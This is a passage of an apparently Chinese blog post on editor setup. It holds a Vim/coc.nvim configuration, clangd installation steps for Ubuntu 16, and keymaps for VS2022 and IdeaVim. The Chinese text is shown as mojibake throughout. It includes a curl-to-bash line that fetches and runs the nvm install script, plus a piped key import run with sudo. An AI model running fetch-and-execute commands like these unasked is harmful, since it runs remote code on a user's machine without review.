é™¤ä¸€ä¸ªå­—ç¬¦å¹¶ä¿®æ”¹æˆ‘ç”¨ä¸åˆ°ï¼Œå¯ä»¥ç”¨rä¿®æ”¹ï¼Œå•è¯å¹³å¸¸éƒ½æ˜¯b cwæˆ–ciwæ¥åˆ é™¤å¹¶ä¿®æ”¹</char></char></p><p><a href="https://github.com/VSCodeVim/Vim">https://github.com/VSCodeVim/Vim</a> é‡Œè¿˜æœ‰å¥½å¤šæœ‰ç”¨çš„</p><h2 id="VIM-1"><a href="#VIM-1" class="headerlink" title="VIM"></a>VIM</h2><p>~&#x2F;.vimrc</p><p><a href="https://vimawesome.com/">https://vimawesome.com/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https:<span class="comment">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br></pre></td></tr></table></figure><p>cocnvim <a href="https://github.com/neoclide/coc.nvim">https://github.com/neoclide/coc.nvim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nodejs &gt;= <span class="number">14.14</span></span><br><span class="line">curl -o- https:<span class="comment">//raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash</span></span><br><span class="line">ä½¿ç”¨çš„æ˜¯ zsh æˆ– fishï¼Œéœ€è¦å°†å®‰è£…è„šæœ¬ä¸­çš„ bash æ›¿æ¢ä¸º zsh æˆ– fish</span><br><span class="line">nvm install <span class="number">16</span>    </span><br><span class="line">nvm use <span class="number">16</span></span><br></pre></td></tr></table></figure><p>å„è¯­è¨€æ”¯æŒ <a href="https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions">https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install clangd</span><br><span class="line">sudo apt install clang-format</span><br><span class="line">:CocInstall coc-clangd</span><br><span class="line">:CocInstall coc-pyright</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;é«˜äº®æœç´¢ç»“æœ</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">&quot;</span>æ™ºèƒ½æ¨æµ‹æœç´¢ï¼Œæœç´¢<span class="built_in">set</span>æ—¶å¤§å°å†™æ•æ„Ÿï¼Œ<span class="built_in">set</span>ä¸æ•æ„Ÿ</span><br><span class="line"><span class="built_in">set</span> smartcase</span><br><span class="line"><span class="string">&quot;æ»šåŠ¨ä¸Šä¸‹ç¼“å­˜5è¡Œ</span></span><br><span class="line"><span class="string">set scrolloff=5</span></span><br><span class="line"><span class="string">set clipboard=unnamedplus</span></span><br><span class="line"><span class="string">set t_Co=256</span></span><br><span class="line"><span class="string">if has(&quot;</span>termguicolors<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    &quot;</span> fix bug <span class="keyword">for</span> vim</span><br><span class="line">    <span class="built_in">set</span> t_8f=[<span class="number">38</span>;<span class="number">2</span>;%lu;%lu;%lum <span class="string">&quot; è¿™é‡Œ^[[38ä¸­çš„^[éœ€è¦æ›¿æ¢,ä½¿ç”¨ctrol+vç„¶åæŒ‰esc</span></span><br><span class="line"><span class="string">    set t_8b=[48;2;%lu;%lu;%lum &quot;</span> è¿™é‡Œ^[[<span class="number">38</span>ä¸­çš„^[éœ€è¦æ›¿æ¢,ä½¿ç”¨ctrol+vç„¶åæŒ‰esc</span><br><span class="line">    <span class="string">&quot; enable true color</span></span><br><span class="line"><span class="string">    set termguicolors</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">&quot;</span>æ’å…¥æ¨¡å¼æ˜¾ç¤ºç»å¯¹è¡Œå·</span><br><span class="line"><span class="string">&quot;å…¶ä»–æ¨¡å¼æ˜¾ç¤ºç›¸å¯¹è¡Œå·</span></span><br><span class="line"><span class="string">set cursorline</span></span><br><span class="line"><span class="string">set number             &quot;</span> Enable line numbering</span><br><span class="line"><span class="string">&quot; augroup numbertoggle   &quot;</span> Toggles relativenumber on and off based on mode</span><br><span class="line"><span class="string">&quot;     autocmd!</span></span><br><span class="line"><span class="string">&quot;</span>     autocmd BufEnter,FocusGained,InsertLeave * <span class="built_in">set</span> relativenumber</span><br><span class="line"><span class="string">&quot;     autocmd BufLeave,FocusLost,InsertEnter   * set norelativenumber</span></span><br><span class="line"><span class="string">&quot;</span> augroup END</span><br><span class="line"><span class="built_in">set</span> mouse=a</span><br><span class="line"><span class="string">&quot; add tab space</span></span><br><span class="line"><span class="string">set ts=2</span></span><br><span class="line"><span class="string">set softtabstop=2</span></span><br><span class="line"><span class="string">set shiftwidth=2</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">set cindent</span></span><br><span class="line"><span class="string">set autoindent</span></span><br><span class="line"><span class="string">inoremap jk  &lt;ESC&gt;</span></span><br><span class="line"><span class="string">nnoremap &lt;s-k&gt; gt</span></span><br><span class="line"><span class="string">nnoremap &lt;s-J&gt; gT</span></span><br><span class="line"><span class="string">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call plug#begin()</span></span><br><span class="line"><span class="string">Plug &#x27;voldikss/vim-floaterm&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_toggle = &#x27;jt&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_new    = &#x27;&lt;F7&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_prev   = &#x27;&lt;F8&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_next   = &#x27;&lt;F9&gt;&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;mg979/vim-visual-multi&#x27;, &#123;&#x27;branch&#x27;: &#x27;master&#x27;&#125;</span></span><br><span class="line"><span class="string">let g:VM_maps                       = &#123;&#125;</span></span><br><span class="line"><span class="string">let g:VM_maps[&#x27;Find Under&#x27;]         = &#x27;&lt;C-j&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:VM_maps[&#x27;Find Subword Under&#x27;] = &#x27;&lt;C-j&gt;&#x27;</span></span><br><span class="line"><span class="string">&quot;</span>æœ€è¿‘æ‰“å¼€æ–‡ä»¶</span><br><span class="line">Plug <span class="string">&#x27;mhinz/vim-startify&#x27;</span></span><br><span class="line"><span class="string">&quot;ä»»åŠ¡æ ç¾åŒ–</span></span><br><span class="line"><span class="string">Plug &#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">&quot;</span>è‡ªåŠ¨æ‹¬å·</span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span></span><br><span class="line"><span class="string">&quot;å½©è™¹æ‹¬å·</span></span><br><span class="line"><span class="string">Plug &#x27;luochen1990/rainbow&#x27;</span></span><br><span class="line"><span class="string">let g:rainbow_active = 1</span></span><br><span class="line"><span class="string">Plug &#x27;preservim/nerdtree&#x27;</span></span><br><span class="line"><span class="string">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span>vim-sneak</span><br><span class="line">Plug <span class="string">&#x27;justinmk/vim-sneak&#x27;</span></span><br><span class="line">let g:sneak<span class="meta">#label = 1</span></span><br><span class="line"><span class="string">&quot;vim-surround</span></span><br><span class="line"><span class="string">Plug &#x27;tpope/vim-surround&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>vim-commentary</span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-commentary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;theme</span></span><br><span class="line"><span class="string">Plug &#x27;joshdick/onedark.vim&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;sainnhe/edge&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;rakr/vim-one&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>coc.nvim</span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Plug <span class="string">&#x27;easymotion/vim-easymotion&#x27;</span></span><br><span class="line"><span class="string">&quot; ä»£ç æ ¼å¼åŒ– nviméœ€è¦å•ç‹¬å®‰è£…python</span></span><br><span class="line"><span class="string">Plug &#x27;vim-autoformat/vim-autoformat&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;vim-scripts/argtextobj.vim&#x27;</span></span><br><span class="line"><span class="string">call plug#end()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>ä¸çŸ¥é“ä¸ºä»€ä¹ˆå…¨å±€çš„é…ç½®ç”¨ä¸äº†ï¼Œåªèƒ½ç‰ºç‰²ä¸€ç‚¹ç‚¹æ€§èƒ½</span><br><span class="line"><span class="string">&quot; clang-format -style=google -dump-config &gt; .clang-format æŠŠè°·æ­Œé£æ ¼ç”Ÿæˆåˆ°æ–‡ä»¶é‡Œ</span></span><br><span class="line"><span class="string">&quot;</span> è‡ªåŠ¨æ‹·è´æ ¹ç›®å½•ä¸‹çš„ .clang-format æ–‡ä»¶åˆ°å½“å‰ç›®å½•</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> augroup copy_clang_format</span><br><span class="line"><span class="string">&quot;   autocmd!</span></span><br><span class="line"><span class="string">&quot;</span>   autocmd BufNewFile,BufRead *.c,*.cpp execute <span class="string">&#x27;silent! !cp /home/grxer/.clang-format &#x27;</span> . expand(<span class="string">&#x27;%:p:h&#x27;</span>) . <span class="string">&#x27;/.clang-format&#x27;</span></span><br><span class="line"><span class="string">&quot; augroup END</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>æŠŠæ ¼å¼æ¢è¯¥è¡Œç»‘å®šåˆ°f4</span><br><span class="line">noremap &lt;F4&gt; :AutoformatLine&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; è®¾ç½®ä¸»ä½“</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if has(&quot;</span>termguicolors<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    set termguicolors</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">&quot;</span> æ™šä¸Š<span class="number">10</span>ç‚¹åˆ°æ—©ä¸Š<span class="number">7</span>ç‚¹ç”¨é»‘è‰²</span><br><span class="line"><span class="string">&quot; if strftime(&quot;</span>%H<span class="string">&quot;) &gt;= 23 || strftime(&quot;</span>%H<span class="string">&quot;) &lt;= 7</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> let g:onedark_terminal_italics=<span class="number">1</span></span><br><span class="line">    let g:oedark_hide_endofbuffer=<span class="number">1</span></span><br><span class="line">    let g:onedark_termcolors=<span class="number">1</span></span><br><span class="line">    <span class="built_in">set</span> background=dark</span><br><span class="line">    colorscheme onedark</span><br><span class="line"><span class="string">&quot;else</span></span><br><span class="line"><span class="string">&quot;</span>    <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line"><span class="string">&quot;      if (has(&quot;</span>nvim<span class="string">&quot;))</span></span><br><span class="line"><span class="string">&quot;</span>        <span class="string">&quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line"><span class="string">&quot;</span>        let $NVIM_TUI_ENABLE_TRUE_COLOR=<span class="number">1</span></span><br><span class="line"><span class="string">&quot;      endif</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="string">&quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="string">&quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="string">&quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line"><span class="string">&quot;        set termguicolors</span></span><br><span class="line"><span class="string">&quot;</span>      endif</span><br><span class="line"><span class="string">&quot;    endif</span></span><br><span class="line"><span class="string">&quot;</span>    let g:current_colorscheme = <span class="string">&quot;one&quot;</span></span><br><span class="line"><span class="string">&quot;    set background=light</span></span><br><span class="line"><span class="string">&quot;</span>    let g:one_allow_italics = <span class="number">1</span> </span><br><span class="line"><span class="string">&quot;    colorscheme one</span></span><br><span class="line"><span class="string">&quot;</span>endif</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; åˆ‡æ¢ä¸»é¢˜å‡½æ•°</span></span><br><span class="line"><span class="string">function! ToggleColorscheme()</span></span><br><span class="line"><span class="string">  if g:current_colorscheme == &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>one<span class="string">&quot;</span></span><br><span class="line"><span class="string">    set background=light</span></span><br><span class="line"><span class="string">    let g:one_allow_italics = 1 </span></span><br><span class="line"><span class="string">    &quot;</span>Credit joshdick</span><br><span class="line">    <span class="string">&quot;Use 24-bit (true-color) mode in Vim/Neovim when outside tmux.</span></span><br><span class="line"><span class="string">    &quot;</span>If yo<span class="string">u&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;</span>s <span class="number">24</span>-bit color support</span><br><span class="line">    <span class="string">&quot;(see &lt; http://sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line"><span class="string">    if (empty($TMUX))</span></span><br><span class="line"><span class="string">      if (has(&quot;</span>nvim<span class="string">&quot;))</span></span><br><span class="line"><span class="string">        &quot;</span>For Neovim <span class="number">0.1</span><span class="number">.3</span> and <span class="number">0.1</span><span class="number">.4</span> &lt; https:<span class="comment">//github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line">        let $NVIM_TUI_ENABLE_TRUE_COLOR=<span class="number">1</span></span><br><span class="line">      endif</span><br><span class="line">      <span class="string">&quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line"><span class="string">      &quot;</span>Based on Vim patch <span class="number">7.4</span><span class="number">.1770</span> (`guicolors` option) &lt; https:<span class="comment">//github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line">      <span class="string">&quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line"><span class="string">      if (has(&quot;</span>termguicolors<span class="string">&quot;))</span></span><br><span class="line"><span class="string">        set termguicolors</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">    colorscheme one </span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    let g:onedark_terminal_italics=1</span></span><br><span class="line"><span class="string">    let g:oedark_hide_endofbuffer=1</span></span><br><span class="line"><span class="string">    let g:onedark_termcolors=1</span></span><br><span class="line"><span class="string">    set background=dark</span></span><br><span class="line"><span class="string">    &quot;</span>Use <span class="number">24</span>-bit (<span class="literal">true</span>-color) mode in Vim/Neovim when outside tmux.</span><br><span class="line">    <span class="string">&quot;If you&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;s 24-bit color support</span></span><br><span class="line"><span class="string">    &quot;</span>(see &lt; http:<span class="comment">//sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line">    <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;nvim&quot;</span>))</span><br><span class="line">        <span class="string">&quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line"><span class="string">        let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">      &quot;</span>For Neovim &gt; <span class="number">0.1</span><span class="number">.5</span> and Vim &gt; patch <span class="number">7.4</span><span class="number">.1799</span> &lt; https:<span class="comment">//github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line">      <span class="string">&quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line"><span class="string">      &quot;</span> &lt; https:<span class="comment">//github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line">        <span class="built_in">set</span> termguicolors</span><br><span class="line">      endif</span><br><span class="line">    endif</span><br><span class="line">    colorscheme onedark </span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; è®¾ç½®å¿«æ·é”®åˆ‡æ¢ä¸»é¢˜</span></span><br><span class="line"><span class="string">nnoremap &lt;C-F6&gt; :call ToggleColorscheme()&lt;CR&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">&quot;cocnvimé…ç½®</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>ç”¨tabå’Œshitft tabæ¥åˆ‡æ¢æç¤ºï¼Œå›è½¦è¡¥å…¨</span><br><span class="line"><span class="string">&quot; Use tab for trigger completion with characters ahead and navigate</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: There<span class="number">&#x27;</span>s always complete item selected by <span class="keyword">default</span>, you may want to enable</span><br><span class="line"><span class="string">&quot; no select by `&quot;</span>suggest.noselect<span class="string">&quot;: true` in your configuration file</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: Use command <span class="string">&#x27;:verbose imap &lt;tab&gt;&#x27;</span> to make sure tab is not mapped by</span><br><span class="line"><span class="string">&quot; other plugin before putting this into your config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>å°†é€‰æ‹©ä¸‹ä¸€ä¸ªæç¤ºæ”¹ä¸ºtab</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#pum#visible() ? coc#pum#next(1) :</span></span><br><span class="line"><span class="string">&quot;       \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;å°†shift tabæ”¹ä¸ºä¸Šä¸€ä¸ªè¡¥å…¨</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt;&lt;S-TAB&gt; coc#pum#visible() ? coc#pum#prev(1) : &quot;</span>\&lt;C-h&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> Make &lt;CR&gt; to accept selected completion item or notify coc.nvim to format</span><br><span class="line"><span class="string">&quot; &lt;C-g&gt;u breaks current undo, please make your own choice</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>å›è½¦è¡¥å…¨</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;CR&gt; coc#pum#visible() ? coc#pum#confirm()</span></span><br><span class="line"><span class="string">                              &quot;</span> \: <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="string">&quot;tabè¡¥å…¨ä¿®æ”¹ä¸º ctrl jå’Œctrl kå·¦å³ç§»åŠ¨å‚æ•°</span></span><br><span class="line"><span class="string">inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">      \ pumvisible() ? &quot;</span>\&lt;C-y&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">      \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">      \ &quot;</span>\&lt;TAB&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function! CheckBackspace() abort</span></span><br><span class="line"><span class="string">  let col = col(&#x27;.&#x27;) - 1</span></span><br><span class="line"><span class="string">  return !col || getline(&#x27;.&#x27;)[col - 1]  =~# &#x27;\s&#x27;</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>cocnvim config</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Having longer updatetime (default is 4000 ms = 4s) leads to noticeable</span></span><br><span class="line"><span class="string">&quot;</span> delays and poor user experience</span><br><span class="line"><span class="string">&quot; ä½¿ç”¨æç¤ºæ›´å¿«</span></span><br><span class="line"><span class="string">set updatetime=200</span></span><br><span class="line"><span class="string">&quot;</span> Always show the signcolumn, otherwise it would shift the text each time</span><br><span class="line"><span class="string">&quot; diagnostics appear/become resolved</span></span><br><span class="line"><span class="string">set signcolumn=yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>ctrl o æç¤ºè¡¥å…¨</span><br><span class="line">inoremap &lt;silent&gt;&lt;expr&gt; &lt;c-o&gt; coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;ç”¨ç©ºæ ¼+å’Œç©ºæ ¼-æŸ¥æ‰¾ä»£ç æŠ¥é”™</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;- &lt;Plug&gt;(coc-diagnostic-prev)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;= &lt;Plug&gt;(coc-diagnostic-next)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>è½¬åˆ°å‡½æ•°å£°æ˜å®šä¹‰å¼•ç”¨ç­‰</span><br><span class="line"><span class="string">&quot; GoTo code navigation</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gd &lt;Plug&gt;(coc-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gy &lt;Plug&gt;(coc-type-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gi &lt;Plug&gt;(coc-implementation)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gr &lt;Plug&gt;(coc-references)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>g+hæ˜¾ç¤ºå‡½æ•°ç­‰çš„å¸®åŠ©æ–‡æ¡£</span><br><span class="line">nnoremap &lt;silent&gt; gh :call ShowDocumentation()&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">function! ShowDocumentation()</span><br><span class="line">  <span class="keyword">if</span> CocAction(<span class="string">&#x27;hasProvider&#x27;</span>, <span class="string">&#x27;hover&#x27;</span>)</span><br><span class="line">    call CocActionAsync(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    call feedkeys(<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;in&#x27;</span>)</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;é«˜äº®å…‰æ ‡å¤„æ‰€æœ‰ä¸€æ ·çš„è¯</span></span><br><span class="line"><span class="string">&quot;</span> Highlight the symbol and its references when holding the cursor</span><br><span class="line">autocmd CursorHold * silent call CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;é‡å‘½åå˜é‡ leaderé»˜è®¤æ˜¯\ æŠŠä»–æ”¹ä¸ºäº†ç©ºæ ¼</span></span><br><span class="line"><span class="string">&quot;</span> Symbol renaming</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">nmap &lt;leader&gt;rn &lt;Plug&gt;(coc-rename)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;ç©ºæ ¼fç©ºæ ¼ æ ¼å¼åŒ–åŒ–ä»£ç ï¼Œä¸è¿‡tabç¼©è¿›æ˜¯2 ä¸çŸ¥é“æ€ä¹ˆæ”¹ </span></span><br><span class="line"><span class="string">&quot;</span> Formatting selected code</span><br><span class="line"><span class="string">&quot; xmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span></span><br><span class="line"><span class="string">&quot;</span> nmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Applying code actions to the selected code block</span></span><br><span class="line"><span class="string">&quot;</span> Example: `&lt;leader&gt;aap` <span class="keyword">for</span> current paragraph</span><br><span class="line">xmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line">nmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;å¿«é€Ÿé€‰ä¸­å‡½æ•°é‡Œçš„æˆ–ç±»ç±»çš„ä¸œè¥¿,aå’Œiçš„åŒºåˆ«å°±æ˜¯é€‰ä¸­å’Œä¸é€‰ä¸­å‡½æ•°æˆ–ç±»åå­—</span></span><br><span class="line"><span class="string">&quot;</span> Map function and class text objects</span><br><span class="line"><span class="string">&quot; NOTE: Requires &#x27;textDocument.documentSymbol&#x27; support from the language server</span></span><br><span class="line"><span class="string">xmap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">omap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">xmap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">omap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">xmap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">omap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">xmap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br><span class="line"><span class="string">omap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br></pre></td></tr></table></figure><p>PlugInstall</p><h4 id="Ubuntu16å®‰è£…cocnvim"><a href="#Ubuntu16å®‰è£…cocnvim" class="headerlink" title="Ubuntu16å®‰è£…cocnvim"></a>Ubuntu16å®‰è£…cocnvim</h4><p>å…ˆæ·»åŠ æºå‡çº§vim8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:jonathonf/vim</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>clangdæ·»åŠ æºå®‰è£…</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vim  /etc/apt/sources.<span class="built_in">list</span>æ·»åŠ ä¸‹é¢çš„æº</span><br><span class="line">deb http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">deb-src http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">å¦‚æœç­¾åé”™è¯¯ W: GPG error: https:<span class="comment">//apt.llvm.org/xenial llvm-toolchain-xenial InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY 15CF4D18AF4F7421</span></span><br><span class="line">æ‰§è¡Œ</span><br><span class="line">wget -O - https:<span class="comment">//apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add -</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install clangd</span><br></pre></td></tr></table></figure><p>å¸è½½</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install ppa-purge &amp;&amp; sudo ppa-purge ppa:jonathonf/vim</span><br></pre></td></tr></table></figure><h2 id="vs2022"><a href="#vs2022" class="headerlink" title="vs2022"></a>vs2022</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inoremap jk &lt;ESC&gt;</span><br><span class="line">nmap &lt;C-O&gt; :vsc View.NavigateBackward&lt;CR&gt;</span><br><span class="line">nmap &lt;C-I&gt; :vsc View.NavigateForward&lt;CR&gt;</span><br><span class="line">nmap gd :vsc Edit.GoToDefinition&lt;CR&gt;</span><br><span class="line">nmap gh :vsc Edit.QuickInfo&lt;CR&gt;</span><br><span class="line">nnoremap &lt;s-k&gt; gt</span><br><span class="line">nnoremap &lt;s-J&gt; gT</span><br><span class="line">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="ideavim"><a href="#ideavim" class="headerlink" title="ideavim"></a>ideavim</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inoremap jk &lt;ESC&gt;</span><br><span class="line"><span class="built_in">set</span> sneak</span><br><span class="line"><span class="built_in">set</span> surround</span><br><span class="line"><span class="built_in">set</span> commentary</span><br><span class="line"><span class="built_in">set</span> 